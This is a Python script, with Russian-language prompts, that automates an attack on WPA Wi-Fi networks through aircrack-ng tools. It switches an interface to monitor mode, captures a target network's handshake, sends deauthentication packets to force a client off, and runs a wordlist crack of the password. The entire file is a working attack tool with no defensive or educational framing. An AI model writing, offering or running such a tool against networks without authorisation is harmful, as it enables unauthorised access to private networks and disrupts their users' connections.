import subprocess
import time
import sys
import os
from itertools import product
import string


def enable_monitor_mode(interface):
    """Enable monitor mode on the wireless interface."""
    subprocess.run(["airmon-ng", "start", interface], check=True)


def disable_monitor_mode(interface):
    """Disable monitor mode on the wireless interface."""
    subprocess.run(["airmon-ng", "stop", interface], check=True)


def capture_handshake(interface, target_bssid, output_file, channel, timeout):
    """Capture WPA handshake using airodump-ng."""
    try:
        subprocess.run([
            "airodump-ng",
            "--bssid", target_bssid,
            "-c", channel,
            "-w", output_file,
            interface
        ], timeout=timeout, check=True)
    except subprocess.TimeoutExpired:
        print("Время ожидания истекло. Рукопожатие не захвачено.")
        return None

    if os.path.exists(f"{output_file}-01.cap"):
        return f"{output_file}-01.cap"
    return None


def send_deauth_packets(interface, target_bssid, station_mac):
    """Send deauth packets to disconnect a client and capture the handshake."""
    try:
        subprocess.run([
            "aireplay-ng",
            "--deauth", "10",
            "-a", target_bssid,
            "-c", station_mac,
            interface
        ], check=True)
        time.sleep(5)  # Даем время для захвата рукопожатия
    except subprocess.CalledProcessError as e:
        print(f"Ошибка при отправке deauth-пакетов: {e}")


def crack_password_from_hccapx(hccapx_file, wordlist):
    """Attempt to crack WPA password using a wordlist."""
    try:
        subprocess.run([
            "aircrack-ng",
            hccapx_file,
            "-w", wordlist
        ], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Ошибка при взломе пароля: {e}")


def list_networks(interface):
    """List available networks using airodump-ng."""
    try:
        print("Сканирование сетей...\n")
        subprocess.run([
            "airodump-ng",
            interface,
            "--write", "scan_output",
            "--output-format", "csv"
        ], timeout=10, check=True)

        # Чтение и вывод результатов сканирования
        with open("scan_output-01.csv", "r") as f:
            for line in f:
                print(line.strip())
    except subprocess.TimeoutExpired:
        print("Сканирование завершено.")


def main():
    interface = input("Введите имя беспроводного интерфейса: ").strip()
    enable_monitor_mode(interface)

    try:
        list_networks(interface)
    except KeyboardInterrupt:
        print("\nСканирование завершено.")
        disable_monitor_mode(interface)
        sys.exit(0)

    target_bssid = input("Введите BSSID целевой сети: ").strip()
    channel = input("Введите канал сети: ").strip()
    output_file = input("Введите имя выходного файла: ").strip()

    captured_file = capture_handshake(interface, target_bssid, output_file, channel, timeout=120)

    if captured_file is None:
        print("Не удалось захватить рукопожатие. Завершаем программу.")
        disable_monitor_mode(interface)
        sys.exit(1)

    send_deauth = input("Отправить deauth пакеты для ускорения захвата? (y/n): ").strip().lower()
    if send_deauth == 'y':
        station_mac = input("Введите MAC адрес клиента: ").strip()
        send_deauth_packets(interface, target_bssid, station_mac)

    wordlist_file = input("Введите путь к словарю паролей: ").strip()
    crack_password_from_hccapx(captured_file, wordlist_file)

    disable_monitor_mode(interface)
    print(f"\nПерехват завершён. Проверьте файл: {captured_file}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nПрограмма прервана пользователем.")
    except subprocess.CalledProcessError as e:
        print(f"Ошибка выполнения команды: {e}")
    except Exception as e:
        print(f"Произошла ошибка: {e}")
